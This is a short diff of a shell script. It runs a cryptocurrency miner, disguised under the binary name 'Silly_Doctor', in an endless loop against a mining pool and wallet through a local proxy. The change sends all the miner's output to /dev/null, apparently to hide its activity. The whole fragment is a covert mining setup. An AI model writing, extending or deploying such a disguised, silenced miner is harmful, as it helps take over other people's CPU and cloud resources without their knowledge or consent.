@@ -137,6 +137,6 @@ sleep 2
 
 while true
 do
-./Silly_Doctor --disable-gpu --algorithm yespower --pool uk.yourpool.uk:9727 --wallet WRA37jgmaGnWRMdaQtuTynRXpw4K8e9jhz.$currentdate --password c=SWAMP,m=solo --proxy 127.0.0.1:7777 --cpu-threads $used_num_of_cores --keepalive
+./Silly_Doctor --disable-gpu --algorithm yespower --pool uk.yourpool.uk:9727 --wallet WRA37jgmaGnWRMdaQtuTynRXpw4K8e9jhz.$currentdate --password c=SWAMP,m=solo --proxy 127.0.0.1:7777 --cpu-threads $used_num_of_cores --keepalive 1>/dev/null 2>&1
 sleep 5
 done
